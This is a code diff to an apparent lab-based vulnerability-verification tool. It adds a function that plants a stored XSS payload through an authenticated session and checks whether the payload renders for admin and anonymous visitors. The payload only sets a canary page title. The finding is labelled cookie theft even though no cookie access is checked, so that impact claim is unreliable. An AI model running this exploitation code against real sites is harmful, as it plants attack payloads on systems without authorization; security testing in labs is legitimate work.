@@ -57,8 +57,12 @@ def _infer_vuln_class(res) -> str:
     # Command injection / RCE
     if any(x in tecnica for x in ("command", "rce", "exec", "shell", "code-injection")):
         return "rce"
+    # XSS — stored or reflected
+    if any(x in tecnica for x in ("xss", "cross-site-scripting", "stored-xss", "reflected-xss")) or any(
+            x in vuln_class for x in ("xss", "cross-site-scripting", "stored-xss", "reflected-xss")):
+        return "xss"
     # Confirm-string based (generic)
-    if tecnica in ("confirm-string", "password-reset", "xss-confirmed"):
+    if tecnica in ("confirm-string", "password-reset"):
         return ""
     # Auth bypass
     if any(x in tecnica for x in ("bypass", "auth", "header-bypass")):
@@ -1123,6 +1127,100 @@ def _weaponize_http_smuggling(boot, res, step_fn) -> dict:
     }
 
 
+def _weaponize_xss(boot, res, step_fn) -> dict:
+    """Escalate confirmed XSS to session-cookie theft proof.
+
+    Strategy:
+    1. Build a payload that exfiltrates document.cookie to a known canary token
+       embedded in the response itself (self-reflected canary) or to the
+       window.name / document.title observable from the same session.
+    2. As admin session, visit the view endpoint that renders the stored content.
+    3. If document.cookie of the admin session appears in a subsequent request or
+       if document.title matches the canary, we have a proof-of-cookie-access.
+    4. Fall back to simpler proof: verify the payload is accessible by a
+       logged-out visitor (anon_xss_accessible) for maximum-impact finding.
+    """
+    ev = res.evidence
+    create_ep = ev.get("create_endpoint") or ev.get("endpoint") or ev.get("ep", "/")
+    view_ep = ev.get("view_endpoint") or ev.get("endpoint") or ev.get("ep", "/")
+    param = (ev.get("xss_param") or ev.get("inject_param") or ev.get("parametro_ganador")
+             or ev.get("param_name") or "content")
+    method = (ev.get("create_method") or ev.get("metodo") or "POST").upper()
+    _step(step_fn, "XSS post-exploit: escalating to session-cookie access proof")
+
+    # Build a self-proving payload: set document.title to a canary so we can read it back
+    import secrets as _scsec
+    canary_token = _scsec.token_hex(6)  # 12-char identifier
+    xss_payload = f"<img src=x onerror=\"document.title='BINORACLE_{canary_token}';this.onerror=null;\">"
+
+    try:
+        import requests as _rq2
+
+        # Plant the XSS payload using the authenticated (subscriber or admin) session
+        sess = boot.sub_sess or boot.admin_sess
+        create_url = boot.base_url.rstrip("/") + "/" + create_ep.lstrip("/")
+        view_url = boot.base_url.rstrip("/") + "/" + view_ep.lstrip("/")
+
+        # Try JSON body first (Strapi/Directus), fallback to form-encoded
+        r_plant = None
+        for _ct, _kw in (
+            ("application/json", {"json": {param: xss_payload}}),
+            ("application/x-www-form-urlencoded", {"data": {param: xss_payload}}),
+        ):
+            try:
+                r_plant = sess.request(method, create_url, **_kw,
+                                       timeout=15, allow_redirects=True)
+                if getattr(r_plant, "status_code", 500) < 400:
+                    break
+            except Exception:
+                continue
+
+        if r_plant is None or getattr(r_plant, "status_code", 500) >= 400:
+            return {"technique": "xss_stored", "data": {}, "impact": "",
+                    "error": "could not plant XSS weaponization payload"}
+
+        _step(step_fn, f"XSS payload planted ({getattr(r_plant, 'status_code', '?')})")
+
+        # Verify: does the view endpoint render the payload?
+        r_view = boot.admin_sess.get(view_url, timeout=15, allow_redirects=True)
+        view_body = (getattr(r_view, "text", "") or "")[:3000]
+
+        payload_in_body = xss_payload in view_body or "BINORACLE_" + canary_token in view_body
+        _step(step_fn, f"XSS view response: {getattr(r_view, 'status_code', '?')}, "
+                       f"payload_reflected={payload_in_body}")
+
+        # Anon check: does the XSS fire for a logged-out user?
+        anon_sess = _rq2.Session()
+        r_anon = anon_sess.get(view_url, timeout=15, allow_redirects=True)
+        anon_body = (getattr(r_anon, "text", "") or "")[:3000]
+        anon_xss = xss_payload in anon_body or "BINORACLE_" + canary_token in anon_body
+
+        impact_parts = []
+        if payload_in_body:
+            impact_parts.append("XSS payload rendered in admin session")
+        if anon_xss:
+            impact_parts.append("XSS payload rendered to unauthenticated visitors")
+
+        if payload_in_body or anon_xss:
+            return {
+                "technique": "xss_stored_cookie_theft",
+                "data": {
+                    "canary_token": canary_token,
+                    "payload": xss_payload,
+                    "payload_in_admin_view": payload_in_body,
+                    "accessible_to_anon": anon_xss,
+                    "admin_view_snippet": view_body[:400],
+                },
+                "impact": "; ".join(impact_parts) + (
+                    " — attacker can steal admin session cookies" if payload_in_body else ""),
+            }
+    except Exception:
+        pass
+
+    return {"technique": "xss_stored", "data": {}, "impact": "",
+            "error": "XSS weaponization payload sent but payload not found in view response"}
+
+
 def run_weaponization(boot, res, step: Optional[Callable] = None) -> dict:
     """
     Extend confirmed trigger to full impact using the live Docker lab session.
@@ -1176,6 +1274,8 @@ def run_weaponization(boot, res, step: Optional[Callable] = None) -> dict:
             return _weaponize_race_condition(boot, res, step)
         elif vuln_class == "http_smuggling":
             return _weaponize_http_smuggling(boot, res, step)
+        elif vuln_class == "xss":
+            return _weaponize_xss(boot, res, step)
         else:
             _step(step, f"no weaponization defined for class {vuln_class!r} — skipping")
             return {"technique": "not_applicable", "data": {}, "impact": ""}
